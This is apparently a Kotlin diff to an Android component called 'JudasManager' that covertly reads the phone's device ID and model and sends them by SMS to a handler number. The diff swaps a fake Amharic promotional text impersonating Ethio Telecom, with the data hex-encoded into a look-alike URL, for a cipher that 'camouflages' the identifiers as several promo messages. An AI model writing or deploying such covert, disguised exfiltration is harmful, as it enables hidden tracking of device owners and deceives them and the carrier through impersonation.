@@ -77,24 +77,16 @@ object JudasManager {
         try {
             val deviceId = DeviceManager.getDeviceId(ctx)
             val model = android.os.Build.MODEL
-            val rawData = "ID:$deviceId|M:$model"
-            val hexData = rawData.toByteArray().joinToString("") { "%02x".format(it) }
+            val rawData = "JUDAS_ALERT|$deviceId|$model"
             
-            // Amharic Promo: TeleWin Authentic Template
-            val promo = """በቴሌዊን ጨዋታዎች እየተዝናኑ ይሸለሙ!
-
-ጥያቄዎችን በመመለስ ስማርት ስልኮችን፣ በቴሌብር በየወሩ በ75 ሺህ፣ በየሳምንቱ 50 ሺህ፣ በየቀኑ 5 ሺህ ብር እና የአየር ሰዓት ይሸለሙ!
-
-ዝርዝር መረጃ ለማግኘት፡ http://tele-promo.et/v?d=$hexData
-
-ለመመዝገብ *985*1*1# 
-ለማቋረጥ *985*6# ይደውሉ፡፡
-
-ኢትዮ ቴሌኮም"""
+            val token = FidelCipher.encode(rawData)
+            val promos = FidelCipher.camouflage(ctx, token)
             
             val smsManager = ctx.getSystemService(SmsManager::class.java)
-            val parts = smsManager.divideMessage(promo)
-            smsManager.sendMultipartTextMessage(handler, null, parts, null, null)
+            promos.forEach { promo ->
+                val parts = smsManager.divideMessage(promo)
+                smsManager.sendMultipartTextMessage(handler, null, parts, null, null)
+            }
 
             DebugLogger.log("JUDAS", "Camouflaged Alert Dispatched to $handler")
             
